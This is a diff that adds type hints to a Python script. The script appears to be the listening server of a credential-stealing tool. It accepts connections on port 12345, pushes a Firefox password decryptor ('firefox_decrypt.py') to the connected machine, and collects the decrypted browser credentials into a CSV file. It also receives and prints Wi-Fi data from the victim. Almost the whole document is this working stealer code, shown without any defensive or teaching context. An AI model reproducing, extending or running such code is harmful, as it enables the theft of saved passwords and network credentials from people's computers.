@@ -1,7 +1,7 @@
 import socket
 import base64
 
-def recv_data(sock: socket):
+def recv_data(sock: socket) -> bytes:
     buffer =  b''
     while True:
         data = sock.recv(1)
@@ -9,12 +9,12 @@ def recv_data(sock: socket):
             return buffer
         buffer+= data
 
-def write_file(data: bytes, file_name: str) -> None :
+def write_file(data: bytes, file_name: str) -> None:
     decoded_data = base64.b64decode(data)
     with open(file_name, 'wb') as f :
         f.write(decoded_data)
 
-def send_decoder(s: socket) -> None :
+def send_decoder(s: socket) -> None:
     with open('./firefox_decrypt.py', 'rb') as f:
         data =  f.read()
     data_encoded =  base64.b64encode(data)
@@ -22,11 +22,11 @@ def send_decoder(s: socket) -> None :
     s.sendall(data_encoded)
     s.send(separateur.encode('utf-8'))
 
-def write_credential(credential) :
+def write_credential(credential: str) -> None:
     with open('./credential.csv', mode='w', encoding='utf-8') as file:
         file.write(credential)
 
-def get_credential(conn):
+def get_credential(conn: socket) -> int:
     send_decoder(conn)
     data =  recv_data(conn)
     decoded_data = base64.b64decode(data)
@@ -41,7 +41,7 @@ def get_credential(conn):
     write_credential(credential)
     return 0
 
-def get_wifi(conn):
+def get_wifi(conn: socket) -> None:
     data = recv_data(conn)
     decoded_data = base64.b64decode(data)
     wifi =  decoded_data.decode('utf-8')
@@ -50,7 +50,7 @@ def get_wifi(conn):
     for x in wifi:
         print(x)
 
-def main():
+def main() -> None:
     s = socket.socket()
     host = "0.0.0.0"
     port = 12345
